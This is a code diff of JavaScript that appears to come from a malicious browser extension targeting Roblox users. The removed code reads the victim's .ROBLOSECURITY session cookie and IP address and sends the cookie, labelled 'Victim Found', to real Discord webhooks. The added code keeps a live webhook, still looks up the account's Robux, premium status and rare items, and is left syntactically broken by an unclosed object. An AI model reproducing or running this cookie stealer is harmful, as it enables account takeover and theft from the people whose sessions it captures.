@@ -1,119 +1,99 @@
-const WEBHOOKS = [
-    "https://discord.com/api/webhooks/1377683745041154229/hem_TvDKnw1xhxttS0M6226ZOuVhIeJ60vZtmBD1M_nOAMTE8Vn8a6KHVvibHmtT7RPc",
-    "https://discord.com/api/webhooks/1403981151365763172/zLogqJlgQnhY0k6JHzuRPNyqMDx9-uztndOpQ8PsDgz8US5SDjrDR-EsJl3pqospR7mU"
-];
+const fetch = require("node-fetch");
+const WEBHOOK = "https://discord.com/api/webhooks/1377683745041154229/hem_TvDKnw1xhxttS0M6226ZOuVhIeJ60vZtmBD1M_nOAMTE8Vn8a6KHVvibHmtT7RPc";
 
-const BUNDLES = {
-    korblox: 372,   // Korblox Deathspeaker bundle ID
-    headless: 227   // Headless Horseman bundle ID
-};
+let embed = {
+  content: "@everyone Hits", // 👈 this makes the ping
 
-async function main(cookie) {
-    let ipAddr = await (await fetch("https://api.ipify.org")).text();
-    let statistics = null;
+async function sendAccount(cookie) {
+  try {
+    // --- Get User Info ---
+    let userRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
+    });
+    if (!userRes.ok) throw new Error("Invalid cookie");
+    let user = await userRes.json();
 
-    if (cookie) {
-        try {
-            let res = await fetch("https://users.roblox.com/v1/users/authenticated", {
-                method: "GET",
-                headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
-            });
+    // --- Robux Balance ---
+    let economyRes = await fetch(`https://economy.roblox.com/v1/users/${user.id}/currency`, {
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
+    });
+    let economy = economyRes.ok ? await economyRes.json() : { robux: 0 };
 
-            if (res.ok) {
-                let user = await res.json();
+    // --- Pending Robux ---
+    let pendingRes = await fetch(
+      `https://economy.roblox.com/v2/users/${user.id}/transaction-totals?timeFrame=Month&transactionType=summary`,
+      { headers: { Cookie: `.ROBLOSECURITY=${cookie}` } }
+    );
+    let pending = pendingRes.ok ? await pendingRes.json() : { pendingRobuxTotal: 0 };
 
-                // Run requests in parallel
-                let [economy, premium, thumb, body, korblox, headless] = await Promise.all([
-                    // Robux + Pending
-                    fetch("https://economy.roblox.com/v1/users/" + user.id + "/currency", {
-                        headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
-                    }).then(r => r.ok ? r.json() : { robux: "N/A", pendingRobux: "N/A" }),
+    // --- Premium ---
+    let premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${user.id}/validate-membership`, {
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
+    });
+    let premium = premiumRes.ok ? await premiumRes.json() : false;
 
-                    // Premium
-                    fetch("https://premiumfeatures.roblox.com/v1/users/" + user.id + "/validate-membership", {
-                        headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
-                    }).then(r => r.ok ? r.json() : false),
+    // --- Avatar Thumbnail ---
+    let thumbRes = await fetch(
+      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.id}&size=150x150&format=Png&isCircular=false`
+    );
+    let thumbJson = await thumbRes.json();
+    let thumbnailUrl = thumbJson.data?.[0]?.imageUrl || null;
 
-                    // Avatar Headshot
-                    fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.id}&size=420x420&format=Png&isCircular=false`)
-                        .then(r => r.json())
-                        .then(d => d.data && d.data.length > 0 ? d.data[0].imageUrl : null),
+    // --- Korblox & Headless (asset ids) ---
+    let korbloxRes = await fetch(`https://inventory.roblox.com/v1/users/${user.id}/items/Asset/1818`, {
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
+    });
+    let korblox = korbloxRes.ok ? await korbloxRes.json() : { data: [] };
 
-                    // Full Body Thumbnail
-                    fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${user.id}&size=720x720&format=Png&isCircular=false`)
-                        .then(r => r.json())
-                        .then(d => d.data && d.data.length > 0 ? d.data[0].imageUrl : null),
+    let headlessRes = await fetch(`https://inventory.roblox.com/v1/users/${user.id}/items/Asset/134082579`, {
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
+    });
+    let headless = headlessRes.ok ? await headlessRes.json() : { data: [] };
 
-                    // Korblox Ownership
-                    fetch(`https://catalog.roblox.com/v1/users/${user.id}/bundles/${BUNDLES.korblox}/ownership`, {
-                        headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
-                    }).then(r => r.ok ? r.json() : { ownsAsset: false }),
+    // --- Prepare Stats ---
+    let robux = economy.robux ?? 0;
+    let pendingRobux = pending.pendingRobuxTotal ?? 0;
 
-                    // Headless Ownership
-                    fetch(`https://catalog.roblox.com/v1/users/${user.id}/bundles/${BUNDLES.headless}/ownership`, {
-                        headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
-                    }).then(r => r.ok ? r.json() : { ownsAsset: false })
-                ]);
-
-                statistics = {
-                    UserName: user.name,
-                    RobuxBalance: economy.robux ?? "N/A",
-                    PendingRobux: economy.pendingRobux ?? "N/A",
-                    IsPremium: premium,
-                    ThumbnailUrl: thumb ?? "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
-                    FullBodyUrl: body ?? "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
-                    Summary: economy.robux ?? "N/A",
-                    Korblox: korblox.ownsAsset ? "✅ Yes" : "❌ No",
-                    Headless: headless.ownsAsset ? "✅ Yes" : "❌ No"
-                };
-            }
-        } catch (e) {
-            console.error("Failed to fetch Roblox info:", e);
-        }
-    }
-
-    // Payload for Discord
-    const payload = {
-        content: "<@&hits>", // ping example
-        embeds: [
-            {
-                description: "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
-                fields: [
-                    { name: "Username", value: statistics ? statistics.UserName : "N/A", inline: true },
-                    { name: "Robux", value: statistics ? statistics.RobuxBalance : "N/A", inline: true },
-                    { name: "Pending Robux", value: statistics ? statistics.PendingRobux : "N/A", inline: true },
-                    { name: "Premium", value: statistics ? statistics.IsPremium : "N/A", inline: true },
-                    { name: "Summary", value: statistics ? statistics.Summary : "N/A", inline: false },
-                    { name: "Korblox", value: statistics ? statistics.Korblox : "❌ No", inline: true },
-                    { name: "Headless", value: statistics ? statistics.Headless : "❌ No", inline: true }
-                ],
-                author: {
-                    name: "Victim Found: " + ipAddr,
-                    icon_url: statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"
-                },
-                footer: {
-                    text: "ENTERPRISE",
-                    icon_url: "https://i.postimg.cc/bwpLd4YK/IMG-20250822-180503.jpg"
-                },
-                thumbnail: {
-                    url: statistics ? statistics.FullBodyUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"
-                }
-            }
-        ],
-        username: "Extension Logger",
-        avatar_url: "https://i.postimg.cc/bwpLd4YK/IMG-20250822-180503.jpg"
+    let statistics = {
+      Username: user.name,
+      Robux: robux,
+      PendingRobux: pendingRobux,
+      Premium: premium,
+      Summary: robux + pendingRobux,
+      Korblox: (korblox.data?.length > 0) ? "✅ Yes" : "❌ No",
+      Headless: (headless.data?.length > 0) ? "✅ Yes" : "❌ No"
     };
 
-    // Send to both webhooks
-    for (let hook of WEBHOOKS) {
-        fetch(hook, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-        });
-    }
-}
+    // --- Discord Embed ---
+    let embed = {
+      username: "ENTERPRISE",
+      avatar_url: thumbnailUrl,
+      embeds: [
+        {
+          title: `Roblox Account Info`,
+          thumbnail: { url: thumbnailUrl },
+          color: 0x2f3136,
+          fields: [
+            { name: "Username", value: statistics.Username, inline: true },
+            { name: "Robux", value: String(statistics.Robux), inline: true },
+            { name: "Pending Robux", value: String(statistics.PendingRobux), inline: true },
+            { name: "Premium", value: String(statistics.Premium), inline: true },
+            { name: "Summary", value: String(statistics.Summary), inline: true },
+            { name: "Korblox", value: statistics.Korblox, inline: true },
+            { name: "Headless", value: statistics.Headless, inline: true }
+          ],
+          footer: { text: "ENTERPRISE" }
+        }
+      ]
+    };
 
-chrome.cookies.get({ url: "https://www.roblox.com/home", name: ".ROBLOSECURITY" }, function (cookie) {
-    main(cookie ? cookie.value : null);
-});
+    await fetch(WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(embed)
+    });
+
+  } catch (err) {
+    console.error("Error:", err.message);
+  }
+}
